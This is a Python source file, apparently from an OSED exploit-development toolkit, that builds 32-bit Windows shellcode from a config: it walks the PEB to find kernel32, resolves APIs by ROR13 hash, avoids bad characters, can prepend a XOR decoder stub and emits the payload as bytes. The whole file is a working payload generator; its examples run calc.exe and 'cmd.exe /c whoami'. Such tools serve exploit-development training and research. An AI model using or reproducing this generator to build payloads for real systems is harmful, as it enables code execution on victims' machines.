#!/usr/bin/env python3
"""sc_builder.py from osed-windbg: config-driven 32-bit Windows shellcode.

Edit the CONFIG block below, then run:  python sc_builder.py
Needs Python 3 and keystone-engine (pip install keystone-engine).
capstone (pip install capstone) is optional; when present the result is disassembled.

The builder hashes every API with ROR13, writes the assembly (PEB walk to kernel32,
an export resolver, LoadLibraryA for other DLLs, one cached address per API, the
calls, the exit), assembles it line by line, reports every bad byte with its offset
and line, writes shellcode.bin and prints the bytes as a Python literal.
Exit code 1 means a check failed.
"""
import collections
import re
import sys

Arg = collections.namedtuple("Arg", "kind value")


def s(text):
    """ANSI string pushed on the stack; the argument is its address."""
    return Arg("s", text)


def w(text):
    """UTF-16LE string pushed on the stack, for W APIs; the argument is its address."""
    return Arg("w", text)


def ref(n):
    """Return value (EAX) of call number n in CALLS, counted from 1."""
    return Arg("ref", n)


def buf(size):
    """Address of `size` bytes of scratch space below EBP (not zeroed), for out-parameters."""
    return Arg("buf", size)


def base(dll):
    """Base address of a DLL: kernel32.dll, or one the builder loads with LoadLibraryA."""
    return Arg("base", dll)


# ==============================================================================
# CONFIG: the only part you edit.
#
# BADCHARS     Bytes the output may not contain. 00 is always added.
# MAX_SIZE     None, or the most bytes the shellcode may take.
# CALLS        (dll, api, [args]) in execution order. Export names are case-sensitive.
#              Each arg is an int (a dword), s("text"), w("text"), ref(n), buf(size)
#              or base("dll"), listed in prototype order; the builder pushes them in
#              reverse. A DLL other than kernel32.dll is loaded once with LoadLibraryA.
# EXIT         "terminate" = TerminateProcess(-1, 0), "exit" = ExitProcess(0),
#              "ret" = restore the registers and return to the caller.
# XOR_ENCODER  True prepends a XOR decoder stub, as plan B when a bad byte remains.
#              The stub decodes in place, so the shellcode page must be writable.
#
# Example 1: run a command, then end the process.
#   CALLS = [
#       ("kernel32.dll", "WinExec", [s("cmd.exe /c whoami > C:\\Users\\Public\\w.txt"), 0]),
#   ]
#   EXIT = "terminate"
#
# Example 2: a message box. user32.dll is loaded with LoadLibraryA first.
#   CALLS = [
#       ("user32.dll", "MessageBoxA", [0, s("Hello from sc_builder"), s("OSED"), 0]),
#   ]
#   EXIT = "exit"
#
# Example 3: write a file. ref(1) is the handle CreateFileA returned; buf(4)
# receives the count WriteFile writes back.
#   CALLS = [
#       ("kernel32.dll", "CreateFileA", [s("C:\\Users\\Public\\out.txt"), 0x40000000, 0, 0, 2, 0x80, 0]),
#       ("kernel32.dll", "WriteFile", [ref(1), s("hello"), 5, buf(4), 0]),
#       ("kernel32.dll", "CloseHandle", [ref(1)]),
#   ]
#   EXIT = "ret"
# ==============================================================================
# >>> CONFIG
BADCHARS = b"\x00"
MAX_SIZE = None
CALLS = [
    ("kernel32.dll", "WinExec", [s("calc.exe"), 1]),
]
EXIT = "terminate"
XOR_ENCODER = False
# <<< CONFIG
# Nothing below needs editing.

try:
    from keystone import Ks, KS_ARCH_X86, KS_MODE_32
except ImportError:
    sys.exit("[-] keystone is missing: pip install keystone-engine")

M32 = 0xFFFFFFFF
KS = Ks(KS_ARCH_X86, KS_MODE_32)
BAD = frozenset(BADCHARS) | {0}
KERNEL32 = "kernel32.dll"
EXIT_APIS = {"terminate": "TerminateProcess", "exit": "ExitProcess"}
LABEL = re.compile(r"^([A-Za-z_][A-Za-z0-9_]*):$")


class BuildError(Exception):
    pass


Op = collections.namedtuple("Op", "asm note")
Op.__new__.__defaults__ = ("",)


def comment(text):
    return Op("", text)


def is_label(op):
    return bool(LABEL.match(op.asm))


def ror13(name):
    value = 0
    for char in name.encode("ascii"):
        value = ((value >> 13) | (value << 19)) & M32
        value = (value + char) & M32
    return value


_encodings = {}


def enc(asm):
    """Bytes of one label-free instruction assembled at offset 0."""
    if asm not in _encodings:
        encoding, _ = KS.asm(asm, 0)
        _encodings[asm] = bytes(encoding or b"")
    return _encodings[asm]


def clean(ops):
    return all(not BAD.intersection(enc(op.asm)) for op in ops)


def length(ops):
    return sum(len(enc(op.asm)) for op in ops)


def noted(ops, note):
    return ops[:-1] + [ops[-1]._replace(note=note)]


def describe(data):
    return '"' + "".join("\\0" if b == 0 else chr(b) if 0x20 <= b <= 0x7E else f"\\x{b:02x}" for b in data) + '"'


def frame_operand(disp):
    return f"dword ptr [ebp{'-' if disp < 0 else '+'}0x{abs(disp):02x}]"


# ---------------------------------------------------------------- constants

def xor_key(value):
    """Per-byte key so that key and value ^ key are both clean, or None."""
    key = 0
    for shift in (0, 8, 16, 24):
        byte = (value >> shift) & 0xFF
        k = next((k for k in range(1, 256) if k not in BAD and (byte ^ k) not in BAD), None)
        if k is None:
            return None
        key |= k << shift
    return key


LOW = {"eax": ("al", "ax"), "ecx": ("cl", "cx"), "edx": ("dl", "dx"), "ebx": ("bl", "bx")}


def load_forms(value, reg):
    """Short ways to put `value` in `reg`; the add/sub splits come from split_forms."""
    v = value & M32
    signed = v - (1 << 32) if v & 0x80000000 else v
    zero = Op(f"xor {reg}, {reg}")
    forms = []
    if v == 0:
        forms += [[zero], [Op(f"sub {reg}, {reg}")]]
    for n in (1, 2, 3):
        if v == n:
            forms.append([zero] + [Op(f"inc {reg}")] * n)
        if signed == -n:
            forms.append([zero] + [Op(f"dec {reg}")] * n)
    if -128 <= signed <= 127:
        forms.append([Op(f"push {hex(v)}"), Op(f"pop {reg}")])
    if reg in LOW and 0 < v <= 0xFFFF:
        forms.append([zero, Op(f"mov {LOW[reg][0 if v <= 0xFF else 1]}, {hex(v)}")])
    forms.append([Op(f"mov {reg}, {hex(v)}")])
    key = xor_key(v)
    if key is not None:
        forms.append([Op(f"mov {reg}, {hex(v ^ key)}"), Op(f"xor {reg}, {hex(key)}")])
    forms.append([Op(f"mov {reg}, {hex(~v & M32)}"), Op(f"not {reg}")])
    forms.append([Op(f"mov {reg}, {hex(-v & M32)}"), Op(f"neg {reg}")])
    return forms


def split_forms(value, reg):
    v = value & M32
    for byte in range(1, 256):
        k = byte * 0x01010101
        yield [Op(f"mov {reg}, {hex((v - k) & M32)}"), Op(f"add {reg}, {hex(k)}")]
        yield [Op(f"mov {reg}, {hex((v + k) & M32)}"), Op(f"sub {reg}, {hex(k)}")]


def shortest_clean(forms):
    usable = [form for form in forms if clean(form)]
    return min(usable, key=length) if usable else None


def load_const(value, reg, note):
    """Shortest clean sequence that leaves `value` in `reg`."""
    form = shortest_clean(load_forms(value, reg)) or next((f for f in split_forms(value, reg) if clean(f)), None)
    if form is None:
        raise BuildError(f"no clean way to load {hex(value & M32)} into {reg} ({note})")
    return noted(form, note)


def push_const(value, note, reg="eax"):
    """Shortest clean sequence that pushes `value`: push imm, or a load into `reg` and push."""
    v = value & M32
    pushed = Op(f"push {reg}")
    forms = [[Op(f"push {hex(v)}")]] + [form + [pushed] for form in load_forms(v, reg)]
    form = shortest_clean(forms) or next((f + [pushed] for f in split_forms(v, reg) if clean(f + [pushed])), None)
    if form is None:
        raise BuildError(f"no clean way to push {hex(v)} ({note})")
    return noted(form, note)


def push_dword_of_text(value, note):
    """A string dword: push it as is, else XOR with a clean key, else the shortest other form.

    XOR comes first because each key byte is picked on its own, so it survives almost
    any bad-char set; an all-zero dword goes to the shorter xor reg, reg form.
    """
    direct = [Op(f"push {hex(value)}")]
    if clean(direct):
        return noted(direct, note)
    if value == 0:
        return push_const(value, note)
    key = xor_key(value)
    if key is not None:
        form = [Op(f"mov eax, {hex(value ^ key)}"), Op(f"xor eax, {hex(key)}"), Op("push eax")]
        if clean(form):
            return noted(form, note + f" (xor key {hex(key)})")
    return push_const(value, note)


def push_text(data):
    """Push `data` (already NUL-terminated) last dword first, so ESP ends up pointing at it."""
    padded = data + b"\x00" * (-len(data) % 4)
    ops = []
    for offset in range(len(padded) - 4, -1, -4):
        chunk = padded[offset:offset + 4]
        ops += push_dword_of_text(int.from_bytes(chunk, "little"), describe(chunk))
    return ops


# ---------------------------------------------------------------- the frame

class Frame:
    """Dword slots in [ebp-0x80, ebp) and scratch buffers below them."""

    def __init__(self):
        self.slots = {}
        self.next_disp = -4
        self.buffer_end = 0x80

    def slot(self, name):
        if name not in self.slots:
            while (self.next_disp & 0xFF) in BAD:
                self.next_disp -= 4
            if self.next_disp < -0x80:
                raise BuildError("more frame slots than fit in [ebp-0x80, ebp)")
            self.slots[name] = self.next_disp
            self.next_disp -= 4
        return frame_operand(self.slots[name])

    def buffer(self, size):
        self.buffer_end += (size + 3) & ~3
        return self.buffer_end

    def reserve(self):
        """Move esp below every slot and buffer: `add esp, -n` when clean, else n through eax."""
        low = max(self.buffer_end + 0x40, 0x100)
        for n in range(low, 0x10000, 4):
            for op in (Op(f"add esp, {hex(-n & M32)}"), Op(f"sub esp, {hex(n)}")):
                if clean([op]):
                    return [op._replace(note=f"esp = ebp - {hex(n)}, below every slot and buffer")]
        return load_const(low, "eax", f"eax = {hex(low)}") + [Op("sub esp, eax", f"esp = ebp - {hex(low)}, below every slot and buffer")]


# ---------------------------------------------------------------- fixed code

def find_kernel32(frame):
    return [
        comment("kernel32 base: TEB -> PEB -> loader data -> modules in initialization order."),
        Op("xor ecx, ecx"),
        Op("mov eax, dword ptr fs:[ecx+0x30]", "PEB; a register base keeps 00 bytes out of the address"),
        Op("mov eax, dword ptr [eax+0x0c]", "PEB_LDR_DATA"),
        Op("mov esi, dword ptr [eax+0x1c]", "first InInitializationOrderModuleList link"),
        Op("k32_next:"),
        Op("mov ebx, dword ptr [esi+0x08]", "DllBase of this entry"),
        Op("lea edi, [esi+0x1c]", "edi -> BaseDllName"),
        Op("mov esi, dword ptr [esi]", "advance now, the checks below use ebx and edi"),
        Op("cmp word ptr [edi], 0x18", "Length 0x18 = 12 UTF-16 chars, as in kernel32.dll"),
        Op("jne k32_next"),
        Op("mov edi, dword ptr [edi+0x04]", "BaseDllName.Buffer"),
        Op("mov al, byte ptr [edi]"),
        Op("and al, 0xdf", "upper case"),
        Op("cmp al, 0x4b", "'K' rules out other 12-char names"),
        Op("jne k32_next"),
        Op(f"mov {frame.slot('kernel32.dll')}, ebx", "kernel32 base"),
    ]


def resolver(frame):
    return [
        comment("Store the resolver address: a backward call pushes it without 00 bytes in the rel32."),
        Op("jmp res_call"),
        Op("res_pop:"),
        Op("pop esi", "esi = resolve_hash"),
        Op(f"mov {frame.slot('resolver')}, esi", "resolver"),
        Op("jmp main"),
        Op("res_call:"),
        Op("call res_pop"),
        comment("resolve_hash(module_base, hash) -> eax = export address, 0 when no name matches."),
        comment("It pops both arguments and keeps every register but eax."),
        Op("resolve_hash:"),
        Op("push ebx"),
        Op("push ecx"),
        Op("push edx"),
        Op("push esi"),
        Op("push edi"),
        Op("mov ebx, dword ptr [esp+0x18]", "module base (5 saved registers + return address above it)"),
        Op("mov eax, dword ptr [ebx+0x3c]", "e_lfanew"),
        Op("mov edi, dword ptr [ebx+eax+0x78]", "export directory RVA"),
        Op("lea edi, [ebx+edi+0x18]", "edi -> NumberOfNames; the next three fields follow at +4, +8, +0xc"),
        Op("mov ecx, dword ptr [edi]", "NumberOfNames, walked from the last name down"),
        Op("rh_scan:"),
        Op("jecxz rh_none"),
        Op("dec ecx"),
        Op("mov esi, dword ptr [edi+0x08]", "AddressOfNames"),
        Op("add esi, ebx"),
        Op("mov esi, dword ptr [esi+ecx*4]", "name RVA"),
        Op("add esi, ebx"),
        Op("xor edx, edx", "running hash"),
        Op("xor eax, eax"),
        Op("rh_char:"),
        Op("lodsb"),
        Op("test al, al"),
        Op("jz rh_hashed"),
        Op("rol edx, 0x13", "same as ror 13; the 0x0d count byte is a common bad char"),
        Op("add edx, eax"),
        Op("jmp rh_char"),
        Op("rh_hashed:"),
        Op("cmp edx, dword ptr [esp+0x1c]", "wanted hash"),
        Op("jne rh_scan"),
        Op("mov esi, dword ptr [edi+0x0c]", "AddressOfNameOrdinals"),
        Op("add esi, ebx"),
        Op("movzx ecx, word ptr [esi+ecx*2]", "name index -> function index"),
        Op("mov esi, dword ptr [edi+0x04]", "AddressOfFunctions"),
        Op("add esi, ebx"),
        Op("mov eax, dword ptr [esi+ecx*4]", "function RVA"),
        Op("add eax, ebx", "function VA"),
        Op("jmp rh_out"),
        Op("rh_none:"),
        Op("xor eax, eax"),
        Op("rh_out:"),
        Op("mov edx, dword ptr [esp+0x14]", "return address"),
        Op("mov dword ptr [esp+0x1c], edx", "over the hash slot, so one add drops both arguments"),
        Op("pop edi"),
        Op("pop esi"),
        Op("pop edx"),
        Op("pop ecx"),
        Op("pop ebx"),
        Op("add esp, 0x08", "ret 8 would encode a 00 byte"),
        Op("ret"),
        Op("main:"),
    ]


# ---------------------------------------------------------------- the plan

Call = collections.namedtuple("Call", "number dll api args")


def dll_key(dll):
    name = str(dll).strip().lower()
    return name if name.endswith(".dll") else name + ".dll"


def parse_config():
    """Check CONFIG and return the calls with numbered, normalized entries."""
    if EXIT not in ("terminate", "exit", "ret"):
        raise BuildError(f'EXIT must be "terminate", "exit" or "ret", not {EXIT!r}')
    if MAX_SIZE is not None and (not isinstance(MAX_SIZE, int) or MAX_SIZE <= 0):
        raise BuildError("MAX_SIZE must be None or a positive int")
    calls = []
    for number, entry in enumerate(CALLS, 1):
        if not (isinstance(entry, tuple) and len(entry) == 3 and isinstance(entry[2], (list, tuple))):
            raise BuildError(f"CALLS entry {number} must be (dll, api, [args]), not {entry!r}")
        dll, api, args = entry
        if not re.match(r"^[A-Za-z_][A-Za-z0-9_]*$", str(api)):
            raise BuildError(f"call {number}: {api!r} is not an export name")
        for arg in args:
            if isinstance(arg, bool) or not isinstance(arg, (int, Arg)):
                raise BuildError(f"call {number} {api}: {arg!r} is not an int, s(), w(), ref(), buf() or base()")
            if isinstance(arg, int) and not -(1 << 31) <= arg <= M32:
                raise BuildError(f"call {number} {api}: {arg} does not fit in a dword")
            if isinstance(arg, Arg) and arg.kind == "ref" and not (isinstance(arg.value, int) and 1 <= arg.value < number):
                raise BuildError(f"call {number} {api}: ref({arg.value!r}) must name an earlier call, 1 to {number - 1}")
            if isinstance(arg, Arg) and arg.kind == "buf" and not (isinstance(arg.value, int) and 0 < arg.value <= 0x4000):
                raise BuildError(f"call {number} {api}: buf({arg.value!r}) needs a size from 1 to 0x4000")
            if isinstance(arg, Arg) and arg.kind == "s":
                try:
                    str(arg.value).encode("latin-1")
                except UnicodeEncodeError:
                    raise BuildError(f"call {number} {api}: s() takes single-byte text, use w() for {arg.value!r}")
        calls.append(Call(number, dll_key(dll), str(api), list(args)))
    return calls


def text_bytes(arg):
    if arg.kind == "s":
        return str(arg.value).encode("latin-1") + b"\x00"
    return str(arg.value).encode("utf-16-le") + b"\x00\x00"


def build_body(calls):
    """The plain shellcode as a list of Op, and the (api, dll, hash) table."""
    frame = Frame()
    frame.slot("resolver")
    exit_api = EXIT_APIS.get(EXIT)
    apis = list(dict.fromkeys([(call.dll, call.api) for call in calls] + ([(KERNEL32, exit_api)] if exit_api else [])))
    dlls = list(dict.fromkeys([dll for dll, _ in apis] + [dll_key(arg.value) for call in calls for arg in call.args
                                                          if isinstance(arg, Arg) and arg.kind == "base"]))
    loaded = [dll for dll in dlls if dll != KERNEL32]
    if loaded and (KERNEL32, "LoadLibraryA") not in apis:
        apis.insert(0, (KERNEL32, "LoadLibraryA"))
    referenced = {arg.value for call in calls for arg in call.args if isinstance(arg, Arg) and arg.kind == "ref"}
    table = [(api, dll, ror13(api)) for dll, api in apis]

    body = [
        comment("Entry: save the caller's registers, open a frame, and move esp below the slots."),
        Op("pushad"),
        Op("mov ebp, esp"),
        None,
    ] + find_kernel32(frame) + resolver(frame)

    body.append(comment("Resolve every API once and keep its address in a frame slot."))

    def resolve(dll, api):
        return push_const(ror13(api), f'ROR13("{api}") = 0x{ror13(api):08x}') + [
            Op(f"push {frame.slot(dll)}", f"{dll} base"),
            Op(f"call {frame.slot('resolver')}", f"eax = {api}"),
            Op(f"mov {frame.slot(dll + '!' + api)}, eax", f"{api} cached"),
        ]

    if loaded:
        body += resolve(KERNEL32, "LoadLibraryA")
    for dll in loaded:
        body.append(comment(f"LoadLibraryA(\"{dll}\"), base cached."))
        body += push_text(dll.encode("latin-1") + b"\x00")
        body += [Op("push esp", f'lpLibFileName -> "{dll}"'),
                 Op(f"call {frame.slot(KERNEL32 + '!LoadLibraryA')}", f"eax = {dll} base"),
                 Op(f"mov {frame.slot(dll)}, eax", f"{dll} base")]
    for dll, api in apis:
        if (dll, api) != (KERNEL32, "LoadLibraryA") or not loaded:
            body += resolve(dll, api)

    for call in calls:
        body.append(comment(f"Call {call.number}: {call.api} from {call.dll}, {len(call.args)} argument(s)."))
        text_slots = {}
        for index, arg in enumerate(call.args):
            if isinstance(arg, Arg) and arg.kind in ("s", "w"):
                data = text_bytes(arg)
                body += push_text(data)
                text_slots[index] = frame.slot(f"text{len(text_slots)}")
                body.append(Op(f"mov {text_slots[index]}, esp", f"-> {describe(data[:-1] if arg.kind == 's' else data[:-2])}"))
        for index in range(len(call.args) - 1, -1, -1):
            arg = call.args[index]
            label = f"arg{index + 1} = {arg if -10 < arg < 10 else hex(arg)}" if isinstance(arg, int) else f"arg{index + 1} = {arg.kind}({arg.value!r})"
            if isinstance(arg, int):
                body += push_const(arg, label)
            elif arg.kind in ("s", "w"):
                body.append(Op(f"push {text_slots[index]}", label))
            elif arg.kind == "ref":
                body.append(Op(f"push {frame.slot(f'ref{arg.value}')}", label))
            elif arg.kind == "base":
                body.append(Op(f"push {frame.slot(dll_key(arg.value))}", label))
            else:
                offset = frame.buffer(arg.value)
                lea = [Op(f"lea eax, [ebp-{hex(offset)}]"), Op("push eax")]
                body += noted(lea if clean(lea) else load_const(-offset, "eax", "") + [Op("add eax, ebp"), Op("push eax")],
                              f"{label}, scratch at ebp-{hex(offset)}")
        body.append(Op(f"call {frame.slot(call.dll + '!' + call.api)}", f"{call.api} pops its own arguments"))
        if call.number in referenced:
            body.append(Op(f"mov {frame.slot(f'ref{call.number}')}, eax", f"ref({call.number}) = {call.api} result"))

    if EXIT == "terminate":
        body.append(comment("Exit: TerminateProcess(-1, 0) ends the process at once."))
        body += push_const(0, "uExitCode = 0") + push_const(M32, "hProcess = -1, the current process")
        body.append(Op(f"call {frame.slot(KERNEL32 + '!TerminateProcess')}"))
    elif EXIT == "exit":
        body.append(comment("Exit: ExitProcess(0)."))
        body += push_const(0, "uExitCode = 0")
        body.append(Op(f"call {frame.slot(KERNEL32 + '!ExitProcess')}"))
    else:
        body += [comment("Exit: restore the caller's stack and registers and return to it."),
                 Op("mov esp, ebp"), Op("popad"), Op("ret")]
    body[3:4] = frame.reserve()
    return body, table


def place(ops):
    """Assemble each instruction alone at its final offset, so every byte maps back to its line."""
    names = {LABEL.match(op.asm).group(1) for op in ops if is_label(op)}
    labels = {}
    for _ in range(16):
        placed, seen, offset = [], {}, 0
        for op in ops:
            if not op.asm:
                continue
            if is_label(op):
                seen[LABEL.match(op.asm).group(1)] = offset
                continue
            text = re.sub(r"\b[A-Za-z_][A-Za-z0-9_]*\b",
                          lambda m: hex(labels.get(m.group(0), offset)) if m.group(0) in names else m.group(0), op.asm)
            try:
                encoding, _ = KS.asm(text, offset)
            except Exception as error:
                raise BuildError(f"cannot assemble {op.asm!r}: {error}")
            encoding = bytes(encoding or b"")
            placed.append((offset, op, encoding))
            offset += len(encoding)
        if seen == labels:
            return placed
        labels = seen
    raise BuildError("label offsets did not settle")


def xor_stub(code):
    """Decoder that XORs `code` in place and jumps to it, with a key that keeps stub and body clean."""
    for key in range(1, 256):
        if key in BAD or any((byte ^ key) in BAD for byte in code):
            continue
        for pad in range(4):
            ops = [comment("XOR decoder: get the body address with a backward call, decode in place, ret into it."),
                   Op("jmp dec_call"),
                   Op("dec_pop:"),
                   Op("pop esi", "esi = encoded body"),
                   Op("push esi", "the ret below jumps to the decoded body")]
            ops += load_const(len(code), "ecx", f"ecx = {len(code)} bytes to decode")
            ops += [Op("dec_loop:"),
                    Op(f"xor byte ptr [esi], {hex(key)}", "writes over the code: the page must be writable"),
                    Op("inc esi"),
                    Op("loop dec_loop"),
                    Op("ret")]
            ops += [Op("nop", "padding keeps the jmp offset clean")] * pad
            ops += [Op("dec_call:"), Op("call dec_pop", "backward call, so the rel32 has no 00 bytes")]
            placed = place(ops)
            if not any(BAD.intersection(encoding) for _, _, encoding in placed):
                return key, ops, placed
    return None


# ---------------------------------------------------------------- reporting

def line_text(op):
    return op.asm + (f"  ; {op.note}" if op.note else "")


def listing(placed, base_offset=0):
    try:
        from capstone import Cs, CS_ARCH_X86, CS_MODE_32
    except ImportError:
        print("[i] capstone not installed (pip install capstone); listing the assembler input instead")
        for offset, op, encoding in placed:
            print(f"    {base_offset + offset:04x}  {encoding.hex(' '):<24} {line_text(op)}")
        return []
    cs = Cs(CS_ARCH_X86, CS_MODE_32)
    problems = []
    for offset, op, encoding in placed:
        decoded = list(cs.disasm(encoding, base_offset + offset))
        if len(decoded) != 1 or decoded[0].size != len(encoding):
            problems.append(f"capstone does not read {op.asm!r} at 0x{base_offset + offset:04x} as one instruction")
        text = "; ".join(f"{i.mnemonic} {i.op_str}".strip() for i in decoded) or "(undecodable)"
        print(f"    {base_offset + offset:04x}  {encoding.hex(' '):<24} {text:<40}{'  ; ' + op.note if op.note else ''}".rstrip())
    return problems


def check(placed, base_offset=0, encoded_with=None):
    """Bad bytes (after XOR when encoded_with is a key) and forward calls with a 00 in the rel32."""
    problems = []
    for offset, op, encoding in placed:
        output = bytes(b ^ encoded_with for b in encoding) if encoded_with is not None else encoding
        for i, byte in enumerate(output):
            if byte in BAD:
                problems.append(f"bad byte 0x{byte:02x} at offset 0x{base_offset + offset + i:04x} in: {line_text(op)}")
        if encoding[:1] == b"\xe8":
            rel = int.from_bytes(encoding[1:5], "little", signed=True)
            if rel >= 0 or 0 in encoding[1:5]:
                problems.append(f"forward call with rel32 0x{rel & M32:08x} at offset 0x{base_offset + offset:04x}: {op.asm}")
    return problems


def main():
    try:
        calls = parse_config()
        body, table = build_body(calls)
        placed = place(body)
    except BuildError as error:
        print(f"[-] {error}")
        return 1
    plain = b"".join(encoding for _, _, encoding in placed)
    whole, _ = KS.asm("\n".join(op.asm for op in body if op.asm), 0)
    problems = [] if bytes(whole) == plain else ["the per-line map differs from the whole assembly"]

    print(f"[+] {len(calls)} call(s), exit {EXIT}, bad chars {' '.join(f'{b:02x}' for b in sorted(BAD))}")
    print('[+] ROR13 hashes; check one in WinDbg with dx @$osed().sc.hash("<api>", "ROR13")')
    print(f"    {'api':<24} {'dll':<16} hash")
    for api, dll, value in table:
        print(f"    {api:<24} {dll:<16} 0x{value:08x}")

    print(f"[+] code, {len(plain)} bytes:")
    problems += listing(placed)
    problems += check(placed)
    code = plain
    if XOR_ENCODER:
        stub = xor_stub(plain)
        if stub is None:
            problems.append("no XOR key keeps both the stub and the encoded body clean")
        else:
            key, _, stub_placed = stub
            stub_bytes = b"".join(encoding for _, _, encoding in stub_placed)
            code = stub_bytes + bytes(b ^ key for b in plain)
            print(f"[!] XOR_ENCODER: {len(stub_bytes)}-byte stub, key 0x{key:02x}. It decodes in place, so the page must be writable.")
            problems += listing(stub_placed)
            problems += check(stub_placed)
            problems += check(placed, len(stub_bytes), key)
            print(f"    {len(stub_bytes):04x}  ... {len(plain)} encoded bytes, the code listed above")

    for problem in problems:
        print(f"[-] {problem}")
    bad_count = sum(1 for byte in code if byte in BAD)
    print(f"[+] {len(code)} bytes" + (f" of MAX_SIZE {MAX_SIZE}" if MAX_SIZE else ""))
    if MAX_SIZE and len(code) > MAX_SIZE:
        problems.append(f"{len(code)} bytes is over MAX_SIZE {MAX_SIZE}")
        print(f"[-] {problems[-1]}")
    print(f"[{'-' if bad_count else '+'}] {bad_count} bad bytes against {' '.join(f'{b:02x}' for b in sorted(BAD))}")
    print(f"[-] {len(problems)} problem(s)" if problems else "[+] 0 problems")

    with open("shellcode.bin", "wb") as handle:
        handle.write(code)
    print("[+] wrote shellcode.bin")
    print('shellcode = b""')
    for start in range(0, len(code), 16):
        print('shellcode += b"' + "".join(f"\\x{byte:02x}" for byte in code[start:start + 16]) + '"')
    return 1 if problems else 0


if __name__ == "__main__":
    sys.exit(main())
